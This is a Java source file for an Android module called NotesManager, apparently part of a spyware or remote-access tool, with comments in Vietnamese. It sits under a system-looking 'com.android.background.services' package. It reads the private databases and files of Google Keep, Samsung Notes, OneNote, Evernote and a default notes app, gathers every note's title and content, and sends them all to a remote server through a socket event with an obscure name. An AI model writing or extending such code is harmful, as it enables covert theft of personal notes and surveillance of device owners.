package com.android.background.services.helpers;

import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import android.util.Log;

import com.android.background.services.IOSocket;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class NotesManager {
    
    private static final String TAG = "NotesManager";
    private static Context context;
    
    public static void setContext(Context ctx) {
        context = ctx;
    }
    
    // Lấy tất cả ghi chú từ các ứng dụng phổ biến
    public static JSONArray getAllNotes() {
        JSONArray allNotes = new JSONArray();
        
        try {
            // Ghi chú từ ứng dụng Ghi chú mặc định
            JSONArray defaultNotes = getDefaultNotes();
            for (int i = 0; i < defaultNotes.length(); i++) {
                allNotes.put(defaultNotes.getJSONObject(i));
            }
            
            // Ghi chú từ Google Keep
            JSONArray keepNotes = getGoogleKeepNotes();
            for (int i = 0; i < keepNotes.length(); i++) {
                allNotes.put(keepNotes.getJSONObject(i));
            }
            
            // Ghi chú từ Samsung Notes
            JSONArray samsungNotes = getSamsungNotes();
            for (int i = 0; i < samsungNotes.length(); i++) {
                allNotes.put(samsungNotes.getJSONObject(i));
            }
            
            // Ghi chú từ OneNote
            JSONArray oneNoteNotes = getOneNoteNotes();
            for (int i = 0; i < oneNoteNotes.length(); i++) {
                allNotes.put(oneNoteNotes.getJSONObject(i));
            }
            
            // Ghi chú từ Evernote
            JSONArray evernoteNotes = getEvernoteNotes();
            for (int i = 0; i < evernoteNotes.length(); i++) {
                allNotes.put(evernoteNotes.getJSONObject(i));
            }
            
        } catch (JSONException e) {
            Log.e(TAG, "Error combining notes: " + e.getMessage());
        }
        
        return allNotes;
    }
    
    // Lấy ghi chú từ ứng dụng Ghi chú mặc định
    private static JSONArray getDefaultNotes() {
        JSONArray notes = new JSONArray();
        
        try {
            // Tìm kiếm file ghi chú trong thư mục ứng dụng
            String[] searchPaths = {
                "/data/data/com.android.notes",
                "/data/data/com.google.android.apps.keep",
                "/data/data/com.samsung.android.app.notes",
                "/data/data/com.microsoft.office.onenote",
                "/data/data/com.evernote"
            };
            
            for (String path : searchPaths) {
                File appDir = new File(path);
                if (appDir.exists() && appDir.canRead()) {
                    JSONArray appNotes = searchNotesInDirectory(appDir, getAppNameFromPath(path));
                    for (int i = 0; i < appNotes.length(); i++) {
                        notes.put(appNotes.getJSONObject(i));
                    }
                }
            }
            
        } catch (JSONException e) {
            Log.e(TAG, "Error getting default notes: " + e.getMessage());
        }
        
        return notes;
    }
    
    // Lấy ghi chú từ Google Keep
    private static JSONArray getGoogleKeepNotes() {
        JSONArray notes = new JSONArray();
        
        try {
            // Đường dẫn database của Google Keep
            String keepDbPath = "/data/data/com.google.android.apps.keep/databases/keep.db";
            File keepDb = new File(keepDbPath);
            
            if (keepDb.exists() && keepDb.canRead()) {
                SQLiteDatabase db = null;
                Cursor cursor = null;
                
                try {
                    db = SQLiteDatabase.openDatabase(keepDbPath, null, SQLiteDatabase.OPEN_READONLY);
                    
                    // Truy vấn bảng notes
                    cursor = db.rawQuery("SELECT * FROM notes", null);
                    
                    if (cursor != null && cursor.moveToFirst()) {
                        do {
                            JSONObject note = new JSONObject();
                            note.put("app", "Google Keep");
                            note.put("title", cursor.getString(cursor.getColumnIndex("title")));
                            note.put("content", cursor.getString(cursor.getColumnIndex("content")));
                            note.put("created", cursor.getLong(cursor.getColumnIndex("created")));
                            note.put("modified", cursor.getLong(cursor.getColumnIndex("modified")));
                            note.put("color", cursor.getInt(cursor.getColumnIndex("color")));
                            note.put("is_archived", cursor.getInt(cursor.getColumnIndex("is_archived")));
                            note.put("is_pinned", cursor.getInt(cursor.getColumnIndex("is_pinned")));
                            
                            notes.put(note);
                        } while (cursor.moveToNext());
                    }
                    
                } catch (SQLiteException e) {
                    Log.e(TAG, "Error reading Google Keep database: " + e.getMessage());
                } finally {
                    if (cursor != null) cursor.close();
                    if (db != null) db.close();
                }
            }
            
        } catch (JSONException e) {
            Log.e(TAG, "Error getting Google Keep notes: " + e.getMessage());
        }
        
        return notes;
    }
    
    // Lấy ghi chú từ Samsung Notes
    private static JSONArray getSamsungNotes() {
        JSONArray notes = new JSONArray();
        
        try {
            String samsungDbPath = "/data/data/com.samsung.android.app.notes/databases/notes.db";
            File samsungDb = new File(samsungDbPath);
            
            if (samsungDb.exists() && samsungDb.canRead()) {
                SQLiteDatabase db = null;
                Cursor cursor = null;
                
                try {
                    db = SQLiteDatabase.openDatabase(samsungDbPath, null, SQLiteDatabase.OPEN_READONLY);
                    
                    // Truy vấn bảng notes
                    cursor = db.rawQuery("SELECT * FROM notes", null);
                    
                    if (cursor != null && cursor.moveToFirst()) {
                        do {
                            JSONObject note = new JSONObject();
                            note.put("app", "Samsung Notes");
                            note.put("title", cursor.getString(cursor.getColumnIndex("title")));
                            note.put("content", cursor.getString(cursor.getColumnIndex("content")));
                            note.put("created", cursor.getLong(cursor.getColumnIndex("created_date")));
                            note.put("modified", cursor.getLong(cursor.getColumnIndex("modified_date")));
                            note.put("color", cursor.getInt(cursor.getColumnIndex("color")));
                            note.put("is_favorite", cursor.getInt(cursor.getColumnIndex("is_favorite")));
                            
                            notes.put(note);
                        } while (cursor.moveToNext());
                    }
                    
                } catch (SQLiteException e) {
                    Log.e(TAG, "Error reading Samsung Notes database: " + e.getMessage());
                } finally {
                    if (cursor != null) cursor.close();
                    if (db != null) db.close();
                }
            }
            
        } catch (JSONException e) {
            Log.e(TAG, "Error getting Samsung Notes: " + e.getMessage());
        }
        
        return notes;
    }
    
    // Lấy ghi chú từ OneNote
    private static JSONArray getOneNoteNotes() {
        JSONArray notes = new JSONArray();
        
        try {
            String oneNoteDbPath = "/data/data/com.microsoft.office.onenote/databases/onenote.db";
            File oneNoteDb = new File(oneNoteDbPath);
            
            if (oneNoteDb.exists() && oneNoteDb.canRead()) {
                SQLiteDatabase db = null;
                Cursor cursor = null;
                
                try {
                    db = SQLiteDatabase.openDatabase(oneNoteDbPath, null, SQLiteDatabase.OPEN_READONLY);
                    
                    // Truy vấn bảng notes
                    cursor = db.rawQuery("SELECT * FROM notes", null);
                    
                    if (cursor != null && cursor.moveToFirst()) {
                        do {
                            JSONObject note = new JSONObject();
                            note.put("app", "OneNote");
                            note.put("title", cursor.getString(cursor.getColumnIndex("title")));
                            note.put("content", cursor.getString(cursor.getColumnIndex("content")));
                            note.put("created", cursor.getLong(cursor.getColumnIndex("created_time")));
                            note.put("modified", cursor.getLong(cursor.getColumnIndex("modified_time")));
                            
                            notes.put(note);
                        } while (cursor.moveToNext());
                    }
                    
                } catch (SQLiteException e) {
                    Log.e(TAG, "Error reading OneNote database: " + e.getMessage());
                } finally {
                    if (cursor != null) cursor.close();
                    if (db != null) db.close();
                }
            }
            
        } catch (JSONException e) {
            Log.e(TAG, "Error getting OneNote notes: " + e.getMessage());
        }
        
        return notes;
    }
    
    // Lấy ghi chú từ Evernote
    private static JSONArray getEvernoteNotes() {
        JSONArray notes = new JSONArray();
        
        try {
            String evernoteDbPath = "/data/data/com.evernote/databases/evernote.db";
            File evernoteDb = new File(evernoteDbPath);
            
            if (evernoteDb.exists() && evernoteDb.canRead()) {
                SQLiteDatabase db = null;
                Cursor cursor = null;
                
                try {
                    db = SQLiteDatabase.openDatabase(evernoteDbPath, null, SQLiteDatabase.OPEN_READONLY);
                    
                    // Truy vấn bảng notes
                    cursor = db.rawQuery("SELECT * FROM notes", null);
                    
                    if (cursor != null && cursor.moveToFirst()) {
                        do {
                            JSONObject note = new JSONObject();
                            note.put("app", "Evernote");
                            note.put("title", cursor.getString(cursor.getColumnIndex("title")));
                            note.put("content", cursor.getString(cursor.getColumnIndex("content")));
                            note.put("created", cursor.getLong(cursor.getColumnIndex("created")));
                            note.put("modified", cursor.getLong(cursor.getColumnIndex("updated")));
                            note.put("notebook", cursor.getString(cursor.getColumnIndex("notebook")));
                            
                            notes.put(note);
                        } while (cursor.moveToNext());
                    }
                    
                } catch (SQLiteException e) {
                    Log.e(TAG, "Error reading Evernote database: " + e.getMessage());
                } finally {
                    if (cursor != null) cursor.close();
                    if (db != null) db.close();
                }
            }
            
        } catch (JSONException e) {
            Log.e(TAG, "Error getting Evernote notes: " + e.getMessage());
        }
        
        return notes;
    }
    
    // Tìm kiếm ghi chú trong thư mục
    private static JSONArray searchNotesInDirectory(File directory, String appName) {
        JSONArray notes = new JSONArray();
        List<File> noteFiles = new ArrayList<>();
        
        try {
            // Tìm tất cả file có thể chứa ghi chú
            searchNoteFilesRecursive(directory, noteFiles);
            
            for (File file : noteFiles) {
                JSONObject note = new JSONObject();
                note.put("app", appName);
                note.put("title", file.getName());
                note.put("path", file.getAbsolutePath());
                note.put("size", file.length());
                note.put("modified", file.lastModified());
                
                // Đọc nội dung file nếu có thể
                String content = readFileContent(file);
                note.put("content", content);
                
                notes.put(note);
            }
            
        } catch (JSONException e) {
            Log.e(TAG, "Error searching notes in directory: " + e.getMessage());
        }
        
        return notes;
    }
    
    // Tìm kiếm file ghi chú đệ quy
    private static void searchNoteFilesRecursive(File directory, List<File> results) {
        if (!directory.exists() || !directory.canRead()) {
            return;
        }
        
        File[] files = directory.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isDirectory()) {
                    searchNoteFilesRecursive(file, results);
                } else {
                    // Kiểm tra xem file có phải là ghi chú không
                    if (isNoteFile(file.getName())) {
                        results.add(file);
                    }
                }
            }
        }
    }
    
    // Kiểm tra file có phải là ghi chú không
    private static boolean isNoteFile(String fileName) {
        String name = fileName.toLowerCase();
        return name.endsWith(".txt") || 
               name.endsWith(".md") || 
               name.endsWith(".note") || 
               name.endsWith(".json") || 
               name.endsWith(".xml") ||
               name.contains("note") ||
               name.contains("memo") ||
               name.contains("todo");
    }
    
    // Đọc nội dung file
    private static String readFileContent(File file) {
        try {
            FileInputStream fis = new FileInputStream(file);
            byte[] data = new byte[(int) file.length()];
            fis.read(data);
            fis.close();
            
            return new String(data, StandardCharsets.UTF_8);
        } catch (IOException e) {
            Log.e(TAG, "Error reading file content: " + e.getMessage());
            return "Không thể đọc nội dung file";
        }
    }
    
    // Lấy tên ứng dụng từ đường dẫn
    private static String getAppNameFromPath(String path) {
        if (path.contains("keep")) return "Google Keep";
        if (path.contains("samsung")) return "Samsung Notes";
        if (path.contains("onenote")) return "OneNote";
        if (path.contains("evernote")) return "Evernote";
        if (path.contains("notes")) return "Default Notes";
        return "Unknown App";
    }
    
    // Tìm kiếm ghi chú theo từ khóa
    public static JSONArray searchNotesByKeyword(String keyword) {
        JSONArray allNotes = getAllNotes();
        JSONArray filteredNotes = new JSONArray();
        
        try {
            for (int i = 0; i < allNotes.length(); i++) {
                JSONObject note = allNotes.getJSONObject(i);
                String title = note.optString("title", "").toLowerCase();
                String content = note.optString("content", "").toLowerCase();
                
                if (title.contains(keyword.toLowerCase()) || content.contains(keyword.toLowerCase())) {
                    filteredNotes.put(note);
                }
            }
        } catch (JSONException e) {
            Log.e(TAG, "Error searching notes by keyword: " + e.getMessage());
        }
        
        return filteredNotes;
    }
    
    // Lấy ghi chú theo ứng dụng
    public static JSONArray getNotesByApp(String appName) {
        JSONArray allNotes = getAllNotes();
        JSONArray appNotes = new JSONArray();
        
        try {
            for (int i = 0; i < allNotes.length(); i++) {
                JSONObject note = allNotes.getJSONObject(i);
                String app = note.optString("app", "");
                
                if (app.equalsIgnoreCase(appName)) {
                    appNotes.put(note);
                }
            }
        } catch (JSONException e) {
            Log.e(TAG, "Error getting notes by app: " + e.getMessage());
        }
        
        return appNotes;
    }
    
    // Xuất ghi chú ra file
    public static void exportNotesToFile(String filePath) {
        try {
            JSONArray allNotes = getAllNotes();
            JSONObject exportData = new JSONObject();
            exportData.put("export_time", System.currentTimeMillis());
            exportData.put("total_notes", allNotes.length());
            exportData.put("notes", allNotes);
            
            // Gửi dữ liệu về server
            JSONObject response = new JSONObject();
            response.put("type", "notes_export");
            response.put("data", exportData);
            response.put("file_path", filePath);
            
            IOSocket.getInstance().getIoSocket().emit("x0000nt", response);
            
        } catch (JSONException e) {
            Log.e(TAG, "Error exporting notes: " + e.getMessage());
        }
    }
}
